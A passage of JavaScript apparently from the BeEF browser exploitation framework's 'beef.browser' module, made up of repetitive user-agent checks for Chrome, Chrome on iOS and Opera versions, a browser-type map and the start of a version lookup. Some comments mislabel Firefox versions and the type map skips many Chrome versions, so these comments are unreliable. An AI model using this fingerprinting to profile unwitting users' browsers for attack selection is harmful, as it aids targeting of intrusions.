        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 82) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 82.
     * @example: beef.browser.isC82iOS()
     */
    isC82iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 82) ? true : false);
    },

    /**
     * Returns true if Chrome 83.
     * @example: beef.browser.isC83()
     */
    isC83: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 83) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 83.
     * @example: beef.browser.isC83iOS()
     */
    isC83iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 83) ? true : false);
    },

    /**
     * Returns true if Chrome 84.
     * @example: beef.browser.isC84()
     */
    isC84: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 84) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 84.
     * @example: beef.browser.isC84iOS()
     */
    isC84iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 84) ? true : false);
    },

    /**
     * Returns true if Chrome 85.
     * @example: beef.browser.isC85()
     */
    isC85: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 85) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 85.
     * @example: beef.browser.isC85iOS()
     */
    isC85iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 85) ? true : false);
    },

    /**
     * Returns true if Chrome 86.
     * @example: beef.browser.isC86()
     */
    isC86: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 86) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 86.
     * @example: beef.browser.isC86iOS()
     */
    isC86iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 86) ? true : false);
    },

    /**
     * Returns true if Chrome 87.
     * @example: beef.browser.isC87()
     */
    isC87: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 87) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 87.
     * @example: beef.browser.isC87iOS()
     */
    isC87iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 87) ? true : false);
    },

    /**
     * Returns true if Chrome 88.
     * @example: beef.browser.isC88()
     */
    isC88: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 88) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 88.
     * @example: beef.browser.isC88iOS()
     */
    isC88iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 88) ? true : false);
    },

    /**
     * Returns true if Chrome 89.
     * @example: beef.browser.isC89()
     */
    isC89: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 89) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 89.
     * @example: beef.browser.isC89iOS()
     */
    isC89iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 89) ? true : false);
    },

    /**
     * Returns true if Chrome 90.
     * @example: beef.browser.isC90()
     */
    isC90: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 90) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 90.
     * @example: beef.browser.isC90iOS()
     */
    isC90iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 90) ? true : false);
    },

    /**
     * Returns true if Chrome 91.
     * @example: beef.browser.isC91()
     */
    isC91: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 91) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 91.
     * @example: beef.browser.isC91iOS()
     */
    isC91iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 91) ? true : false);
    },

    /**
     * Returns true if Chrome 92.
     * @example: beef.browser.isC92()
     */
    isC92: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 92) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 92.
     * @example: beef.browser.isC92iOS()
     */
    isC92iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 92) ? true : false);
    },

    /**
     * Returns true if Chrome 93.
     * @example: beef.browser.isC93()
     */
    isC93: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 93) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 93.
     * @example: beef.browser.isC93iOS()
     */
    isC93iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 93) ? true : false);
    },

    /**
     * Returns true if Chrome 94.
     * @example: beef.browser.isC94()
     */
    isC94: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 94) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 94.
     * @example: beef.browser.isC94iOS()
     */
    isC94iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 94) ? true : false);
    },

    /**
     * Returns true if Chrome 95.
     * @example: beef.browser.isC95()
     */
    isC95: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 95) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 95.
     * @example: beef.browser.isC95iOS()
     */
    isC95iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 95) ? true : false);
    },

    /**
     * Returns true if Chrome 96.
     * @example: beef.browser.isC96()
     */
    isC96: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 96) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 96.
     * @example: beef.browser.isC96iOS()
     */
    isC96iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 96) ? true : false);
    },

    /**
     * Returns true if Chrome 97.
     * @example: beef.browser.isC97()
     */
    isC97: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 97) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 97.
     * @example: beef.browser.isC97iOS()
     */
    isC97iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 97) ? true : false);
    },

    /**
     * Returns true if Chrome 98.
     * @example: beef.browser.isC98()
     */
    isC98: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 98) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 98.
     * @example: beef.browser.isC98iOS()
     */
    isC98iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 98) ? true : false);
    },

    /**
     * Returns true if Chrome 99.
     * @example: beef.browser.isC99()
     */
    isC99: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 99) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 99.
     * @example: beef.browser.isC99iOS()
     */
    isC99iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 99) ? true : false);
    },

    /**
     * Returns true if Chrome.
     * @example: beef.browser.isC()
     */
    isC: function() {
        return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16() || this.isC17() || this.isC18() || this.isC19() || this.isC19iOS() || this.isC20() || this.isC20iOS() || this.isC21() || this.isC21iOS() || this.isC22() || this.isC22iOS() || this.isC23() || this.isC23iOS() || this.isC24() || this.isC24iOS() || this.isC25() || this.isC25iOS() || this.isC26() || this.isC26iOS() || this.isC27() || this.isC27iOS() || this.isC28() || this.isC28iOS() || this.isC29() || this.isC29iOS() || this.isC30() || this.isC30iOS() || this.isC31() || this.isC31iOS() || this.isC32() || this.isC32iOS() || this.isC33() || this.isC33iOS() || this.isC34() || this.isC34iOS() || this.isC35() || this.isC35iOS() || this.isC36() || this.isC36iOS() || this.isC37() || this.isC37iOS() || this.isC38() || this.isC38iOS() || this.isC39() || this.isC39iOS() || this.isC40() || this.isC40iOS() || this.isC41() || this.isC41iOS() || this.isC42() || this.isC42iOS() || this.isC43() || this.isC43iOS() || this.isC44() || this.isC44iOS() || this.isC45() || this.isC45iOS() || this.isC46() || this.isC46iOS() || this.isC47() || this.isC47iOS() || this.isC48() || this.isC48iOS() || this.isC49() || this.isC49iOS() || this.isC50() || this.isC50iOS() || this.isC51() || this.isC51iOS() || this.isC52() || this.isC52iOS() || this.isC53() || this.isC53iOS() || this.isC54() || this.isC54iOS() || this.isC55() || this.isC55iOS() || this.isC56() || this.isC56iOS() || this.isC57() || this.isC57iOS() || this.isC58() || this.isC58iOS() || this.isC59() || this.isC59iOS() || this.isC60() || this.isC60iOS() || this.isC61() || this.isC61iOS() || this.isC62() || this.isC62iOS() || this.isC63() || this.isC63iOS() || this.isC64() || this.isC64iOS() || this.isC65() || this.isC65iOS() || this.isC66() || this.isC66iOS() || this.isC67() || this.isC67iOS() || this.isC68() || this.isC68iOS() || this.isC69() || this.isC69iOS() || this.isC70() || this.isC70iOS() || this.isC71() || this.isC71iOS() || this.isC72() || this.isC72iOS() || this.isC73() || this.isC73iOS() || this.isC74() || this.isC74iOS() || this.isC75() || this.isC75iOS() || this.isC76() || this.isC76iOS() || this.isC77() || this.isC77iOS() || this.isC78() || this.isC78iOS() || this.isC79() || this.isC79iOS() || this.isC80() || this.isC80iOS() || this.isC81() || this.isC81iOS() || this.isC82() || this.isC82iOS() || this.isC83() || this.isC83iOS() || this.isC84() || this.isC84iOS() || this.isC85() || this.isC85iOS() || this.isC86() || this.isC86iOS() || this.isC87() || this.isC87iOS() || this.isC88() || this.isC88iOS() || this.isC89() || this.isC89iOS() || this.isC90() || this.isC90iOS() || this.isC91() || this.isC91iOS() || this.isC92() || this.isC92iOS() || this.isC93() || this.isC93iOS() || this.isC94() || this.isC94iOS() || this.isC95() || this.isC95iOS() || this.isC96() || this.isC96iOS() || this.isC97() || this.isC97iOS() || this.isC98() || this.isC98iOS() || this.isC99() || this.isC99iOS();
    },

    /**
     * Returns true if Opera 9.50 through 9.52.
     * @example: beef.browser.isO9_52()
     */
    isO9_52: function() {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
    },

    /**
     * Returns true if Opera 9.60 through 9.64.
     * @example: beef.browser.isO9_60()
     */
    isO9_60: function() {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
    },

    /**
     * Returns true if Opera 10.xx.
     * @example: beef.browser.isO10()
     */
    isO10: function() {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
    },

    /**
     * Returns true if Opera 11.xx.
     * @example: beef.browser.isO11()
     */
    isO11: function() {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
    },

    /**
     * Returns true if Opera 12.xx.
     * @example: beef.browser.isO12()
     */
    isO12: function() {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/12\./) != null));
    },

    /**
     * Returns true if Opera.
     * @example: beef.browser.isO()
     */
    isO: function() {
        return this.isO9_52() || this.isO9_60() || this.isO10() || this.isO11() || this.isO12();
    },

    /**
     * Returns the type of browser being used.
     * @example: beef.browser.type().IE6
     * @example: beef.browser.type().FF
     * @example: beef.browser.type().O
     */
    type: function() {

        return {
            C5: this.isC5(),
            // Chrome 5
            C6: this.isC6(),
            // Chrome 6
            C7: this.isC7(),
            // Chrome 7
            C8: this.isC8(),
            // Chrome 8
            C9: this.isC9(),
            // Chrome 9
            C10: this.isC10(),
            // Chrome 10
            C11: this.isC11(),
            // Chrome 11
            C12: this.isC12(),
            // Chrome 12
            C13: this.isC13(),
            // Chrome 13
            C14: this.isC14(),
            // Chrome 14
            C15: this.isC15(),
            // Chrome 15
            C16: this.isC16(),
            // Chrome 16
            C17: this.isC17(),
            // Chrome 17
            C18: this.isC18(),
            // Chrome 18
            C19: this.isC19(),
            // Chrome 19
            C19iOS: this.isC19iOS(),
            // Chrome 19 on iOS
            C20: this.isC20(),
            // Chrome 20
            C20iOS: this.isC20iOS(),
            // Chrome 20 on iOS
            C21: this.isC21(),
            // Chrome 21
            C21iOS: this.isC21iOS(),
            // Chrome 21 on iOS
            C22: this.isC22(),
            // Chrome 22
            C22iOS: this.isC22iOS(),
            // Chrome 22 on iOS
            C23: this.isC23(),
            // Chrome 23
            C23iOS: this.isC23iOS(),
            // Chrome 23 on iOS
            C24: this.isC24(),
            // Chrome 24
            C24iOS: this.isC24iOS(),
            // Chrome 24 on iOS
            C25: this.isC25(),
            // Chrome 25
            C25iOS: this.isC25iOS(),
            // Chrome 25 on iOS
            C26: this.isC26(),
            // Chrome 26
            C26iOS: this.isC26iOS(),
            // Chrome 26 on iOS
            C27: this.isC27(),
            // Chrome 27
            C27iOS: this.isC27iOS(),
            // Chrome 27 on iOS
            C28: this.isC28(),
            // Chrome 28
            C28iOS: this.isC28iOS(),
            // Chrome 28 on iOS
            C29: this.isC29(),
            // Chrome 29
            C29iOS: this.isC29iOS(),
            // Chrome 29 on iOS
            C30: this.isC30(),
            // Chrome 30
            C30iOS: this.isC30iOS(),
            // Chrome 30 on iOS
            C31: this.isC31(),
            // Chrome 31
            C31iOS: this.isC31iOS(),
            // Chrome 31 on iOS
            C32: this.isC32(),
            // Chrome 32
            C32iOS: this.isC32iOS(),
            // Chrome 32 on iOS
            C33: this.isC33(),
            // Chrome 33
            C33iOS: this.isC33iOS(),
            // Chrome 33 on iOS
            C34: this.isC34(),
            // Chrome 34
            C34iOS: this.isC34iOS(),
            // Chrome 34 on iOS
            C35: this.isC35(),
            // Chrome 35
            C35iOS: this.isC35iOS(),
            // Chrome 35 on iOS
            C36: this.isC36(),
            // Chrome 36
            C36iOS: this.isC36iOS(),
            // Chrome 36 on iOS
            C37: this.isC37(),
            // Chrome 37
            C37iOS: this.isC37iOS(),
            // Chrome 37 on iOS
            C38: this.isC38(),
            // Chrome 38
            C38iOS: this.isC38iOS(),
            // Chrome 38 on iOS
            C39: this.isC39(),
            // Chrome 39
            C39iOS: this.isC39iOS(),
            // Chrome 39 on iOS
            C40: this.isC40(),
            // Chrome 40
            C40iOS: this.isC40iOS(),
            // Chrome 40 on iOS
            C41: this.isC41(),
            // Chrome 41
            C41iOS: this.isC41iOS(),
            // Chrome 41 on iOS
            C42: this.isC42(),
            // Chrome 42
            C42iOS: this.isC42iOS(),
            // Chrome 42 on iOS
            C43: this.isC43(),
            // Chrome 43
            C43iOS: this.isC43iOS(),
            // Chrome 43 on iOS
            C44: this.isC44(),
            // Chrome 44
            C44iOS: this.isC44iOS(),
            // Chrome 44 on iOS
            C45: this.isC45(),
            // Chrome 45
            C45iOS: this.isC45iOS(),
            // Chrome 45 on iOS
            C46: this.isC46(),
            // Chrome 46
            C46iOS: this.isC46iOS(),
            // Chrome 46 on iOS
            C47: this.isC47(),
            // Chrome 47
            C47iOS: this.isC47iOS(),
            // Chrome 47 on iOS
            C48: this.isC48(),
            // Chrome 48
            C48iOS: this.isC48iOS(),
            // Chrome 48 on iOS
            C49: this.isC49(),
            // Chrome 49
            C49iOS: this.isC49iOS(),
            // Chrome 49 on iOS
            C50: this.isC50(),
            // Chrome 50
            C50iOS: this.isC50iOS(),
            // Chrome 50 on iOS
            C51: this.isC51(),
            // Chrome 51
            C51iOS: this.isC51iOS(),
            // Chrome 51 on iOS
            C52: this.isC52(),
            // Chrome 52
            C52iOS: this.isC52iOS(),
            // Chrome 52 on iOS
            C53: this.isC53(),
            // Chrome 53
            C53iOS: this.isC53iOS(),
            // Chrome 53 on iOS
            C54: this.isC54(),
            // Chrome 54
            C54iOS: this.isC54iOS(),
            // Chrome 54 on iOS
            C55: this.isC55(),
            // Chrome 55
            C55iOS: this.isC55iOS(),
            // Chrome 55 on iOS
            C56: this.isC56(),
            // Chrome 56
            C56iOS: this.isC56iOS(),
            // Chrome 56 on iOS
            C57: this.isC57(),
            // Chrome 57
            C57iOS: this.isC57iOS(),
            // Chrome 57 on iOS
            C58: this.isC58(),
            // Chrome 58
            C58iOS: this.isC58iOS(),
            // Chrome 58 on iOS
            C63iOS: this.isC63iOS(),
            C: this.isC(),
            // Chrome any version

            FF2: this.isFF2(),
            // Firefox 2
            FF3: this.isFF3(),
            // Firefox 3
            FF3_5: this.isFF3_5(),
            // Firefox 3.5
            FF3_6: this.isFF3_6(),
            // Firefox 3.6
            FF4: this.isFF4(),
            // Firefox 4
            FF5: this.isFF5(),
            // Firefox 5
            FF6: this.isFF6(),
            // Firefox 6
            FF7: this.isFF7(),
            // Firefox 7
            FF8: this.isFF8(),
            // Firefox 8
            FF9: this.isFF9(),
            // Firefox 9
            FF10: this.isFF10(),
            // Firefox 10
            FF11: this.isFF11(),
            // Firefox 11
            FF12: this.isFF12(),
            // Firefox 12
            FF13: this.isFF13(),
            // Firefox 13
            FF14: this.isFF14(),
            // Firefox 14
            FF15: this.isFF15(),
            // Firefox 15
            FF16: this.isFF16(),
            // Firefox 16
            FF17: this.isFF17(),
            // Firefox 17
            FF18: this.isFF18(),
            // Firefox 18
            FF19: this.isFF19(),
            // Firefox 19
            FF20: this.isFF20(),
            // Firefox 20
            FF21: this.isFF21(),
            // Firefox 21
            FF22: this.isFF22(),
            // Firefox 22
            FF23: this.isFF23(),
            // Firefox 23
            FF24: this.isFF24(),
            // Firefox 24
            FF25: this.isFF25(),
            // Firefox 25
            FF26: this.isFF26(),
            // Firefox 26
            FF27: this.isFF27(),
            // Firefox 27
            FF28: this.isFF28(),
            // Firefox 28
            FF29: this.isFF29(),
            // Firefox 29
            FF30: this.isFF30(),
            // Firefox 30
            FF31: this.isFF31(),
            // Firefox 31
            FF32: this.isFF32(),
            // Firefox 32
            FF33: this.isFF33(),
            // Firefox 33
            FF34: this.isFF34(),
            // Firefox 34
            FF35: this.isFF35(),
            // Firefox 35
            FF36: this.isFF36(),
            // Firefox 36
            FF37: this.isFF37(),
            // Firefox 37
            FF38: this.isFF38(),
            // Firefox 38
            FF39: this.isFF39(),
            // Firefox 39
            FF40: this.isFF40(),
            // Firefox 40
            FF41: this.isFF41(),
            // Firefox 41
            FF42: this.isFF42(),
            // Firefox 42
            FF43: this.isFF43(),
            // Firefox 43
            FF44: this.isFF44(),
            // Firefox 44
            FF45: this.isFF45(),
            // Firefox 45
            FF46: this.isFF46(),
            // Firefox 46
            FF47: this.isFF47(),
            // Firefox 47
            FF48: this.isFF48(),
            // Firefox 48
            FF49: this.isFF49(),
            // Firefox 49
            FF50: this.isFF50(),
            // Firefox 50
            FF51: this.isFF51(),
            // Firefox 51
            FF52: this.isFF52(),
            // Firefox 52
            FF53: this.isFF53(),
            // Firefox 53
            FF54: this.isFF54(),
            // Firefox 54
            FF55: this.isFF55(),
            // Firefox 55
            FF56: this.isFF56(),
            // Firefox 56
            FF57: this.isFF57(),
            // Firefox 57
            FF58: this.isFF58(),
            // Firefox 58
            FF59: this.isFF59(),
            // Firefox 59
            FF60: this.isFF60(),
            // Firefox 60
            FF61: this.isFF61(),
            // Firefox 61
            FF62: this.isFF62(),
            // Firefox 62
            FF63: this.isFF63(),
            // Firefox 63
            FF64: this.isFF64(),
            // Firefox 64
            FF65: this.isFF65(),
            // Firefox 65
            FF66: this.isFF66(),
            // Firefox 66
            FF67: this.isFF67(),
            // Firefox 67
            FF68: this.isFF68(),
            // Firefox 68
            FF69: this.isFF69(),
            // Firefox 69
            FF70: this.isFF70(),
            // Firefox 70
            FF71: this.isFF71(),
            // Firefox 71
            FF72: this.isFF72(),
            // Firefox 72
            FF73: this.isFF73(),
            // Firefox 73
            FF74: this.isFF74(),
            // Firefox 74
            FF75: this.isFF75(),
            // Firefox 75
            FF76: this.isFF76(),
            // Firefox 76
            FF77: this.isFF77(),
            // Firefox 77
            FF78: this.isFF78(),
            // Firefox 78
            FF79: this.isFF79(),
            // Firefox 79
            FF80: this.isFF80(),
            // Firefox 70
            FF81: this.isFF81(),
            // Firefox 81
            FF82: this.isFF82(),
            // Firefox 82
            FF83: this.isFF83(),
            // Firefox 83
            FF84: this.isFF84(),
            // Firefox 85
            FF85: this.isFF85(),
            // Firefox 85
            FF86: this.isFF86(),
            // Firefox 85
            FF87: this.isFF87(),
            // Firefox 87
            FF88: this.isFF88(),
            // Firefox 85
            FF89: this.isFF89(),
            // Firefox 85
            FF90: this.isFF90(),
            // Firefox 80
            FF91: this.isFF91(),
            // Firefox 95
            FF92: this.isFF92(),
            // Firefox 92
            FF93: this.isFF93(),
            // Firefox 95
            FF94: this.isFF94(),
            // Firefox 94
            FF95: this.isFF95(),
            // Firefox 95
            FF96: this.isFF96(),
            // Firefox 96
            FF97: this.isFF97(),
            // Firefox 97
            FF98: this.isFF98(),
            // Firefox 98
            FF99: this.isFF99(),
            // Firefox 99

            FF: this.isFF(),
            // Firefox any version

            IE6: this.isIE6(),
            // Internet Explorer 6
            IE7: this.isIE7(),
            // Internet Explorer 7
            IE8: this.isIE8(),
            // Internet Explorer 8
            IE9: this.isIE9(),
            // Internet Explorer 9
            IE10: this.isIE10(),
            // Internet Explorer 10
            IE11: this.isIE11(),
            // Internet Explorer 11
            IE: this.isIE(),
            // Internet Explorer any version

            O9_52: this.isO9_52(),
            // Opera 9.50 through 9.52
            O9_60: this.isO9_60(),
            // Opera 9.60 through 9.64
            O10: this.isO10(),
            // Opera 10.xx
            O11: this.isO11(),
            // Opera 11.xx
            O12: this.isO12(),
            // Opera 12.xx
            O: this.isO(),
            // Opera any version

            EP: this.isEpi(),
            // Epiphany any version

            S4: this.isS4(),
            // Safari 4.xx
            S5: this.isS5(),
            // Safari 5.xx
            S6: this.isS6(),
            // Safari 6.x
            S7: this.isS7(),
            // Safari 7.x
            S8: this.isS8(),
            // Safari 8.x
            S: this.isS()// Safari any version
        }
    },

    /**
     * Returns the major version of the browser being used.
     * @return: {String} version number || 'UNKNOWN'.
     *
     * @example: beef.browser.getBrowserVersion()
     */
    getBrowserVersion: function() {
        if (this.isEdge()) {
            try {
                return platform.version;
            } catch (e) {
                return 'unknown';
            }
        }
        ;// Microsoft Edge

        if (this.isC5()) {
            return '5'
        }
        ;// Chrome 5
        if (this.isC6()) {
            return '6'
        }
        ;// Chrome 6
        if (this.isC7()) {
            return '7'
        }
        ;// Chrome 7
        if (this.isC8()) {
            return '8'
        }
        ;// Chrome 8
        if (this.isC9()) {
            return '9'
        }
        ;// Chrome 9
        if (this.isC10()) {
            return '10'
        }
        ;// Chrome 10
        if (this.isC11()) {
            return '11'
        }
        ;// Chrome 11
        if (this.isC12()) {
            return '12'
        }
        ;// Chrome 12
        if (this.isC13()) {
            return '13'
        }
        ;// Chrome 13
        if (this.isC14()) {
            return '14'
        }
        ;// Chrome 14
        if (this.isC15()) {
            return '15'
        }
        ;// Chrome 15
        if (this.isC16()) {
            return '16'
        }
        ;// Chrome 16
        if (this.isC17()) {
            return '17'
        }
        ;// Chrome 17
        if (this.isC18()) {
            return '18'
        }
        ;// Chrome 18
        if (this.isC19()) {
            return '19'
        }
        ;// Chrome 19
        if (this.isC19iOS()) {
            return '19'
        }
        ;// Chrome 19 for iOS
        if (this.isC20()) {
            return '20'
        }
        ;// Chrome 20
        if (this.isC20iOS()) {
            return '20'
        }
        ;// Chrome 20 for iOS
        if (this.isC21()) {
            return '21'
        }
        ;// Chrome 21
        if (this.isC21iOS()) {
            return '21'
        }
        ;// Chrome 21 for iOS
        if (this.isC22()) {
            return '22'
        }
        ;// Chrome 22
        if (this.isC22iOS()) {
            return '22'
        }
        ;// Chrome 22 for iOS
        if (this.isC23()) {
            return '23'
        }
        ;// Chrome 23
        if (this.isC23iOS()) {
            return '23'
        }
        ;// Chrome 23 for iOS
        if (this.isC24()) {
            return '24'
        }
        ;// Chrome 24
        if (this.isC24iOS()) {
            return '24'
        }
        ;// Chrome 24 for iOS
        if (this.isC25()) {
            return '25'
        }
        ;// Chrome 25
        if (this.isC25iOS()) {
            return '25'
        }
        ;// Chrome 25 for iOS
        if (this.isC26()) {
            return '26'
        }
        ;// Chrome 26
        if (this.isC26iOS()) {
            return '26'
        }
        ;// Chrome 26 for iOS
        if (this.isC27()) {
            return '27'
        }
        ;// Chrome 27
        if (this.isC27iOS()) {
            return '27'
        }
        ;// Chrome 27 for iOS
        if (this.isC28()) {
            return '28'
        }
        ;// Chrome 28
        if (this.isC28iOS()) {
            return '28'
        }
        ;// Chrome 28 for iOS
        if (this.isC29()) {
            return '29'
        }
        ;// Chrome 29
        if (this.isC29iOS()) {
            return '29'
        }
        ;// Chrome 29 for iOS
        if (this.isC30()) {
            return '30'
        }
        ;// Chrome 30
        if (this.isC30iOS()) {
            return '30'
        }
        ;// Chrome 30 for iOS
        if (this.isC31()) {
            return '31'
        }
        ;// Chrome 31
        if (this.isC31iOS()) {
            return '31'
        }
        ;// Chrome 31 for iOS
        if (this.isC32()) {
            return '32'
        }
        ;// Chrome 32
        if (this.isC32iOS()) {
            return '32'
        }
        ;// Chrome 32 for iOS
        if (this.isC33()) {
            return '33'
        }
        ;// Chrome 33
        if (this.isC33iOS()) {
            return '33'
        }
        ;// Chrome 33 for iOS
        if (this.isC34()) {
            return '34'
        }
        ;// Chrome 34
        if (this.isC34iOS()) {
            return '34'
        }
        ;// Chrome 34 for iOS
        if (this.isC35()) {
            return '35'
        }
        ;// Chrome 35
        if (this.isC35iOS()) {
            return '35'
        }
        ;// Chrome 35 for iOS
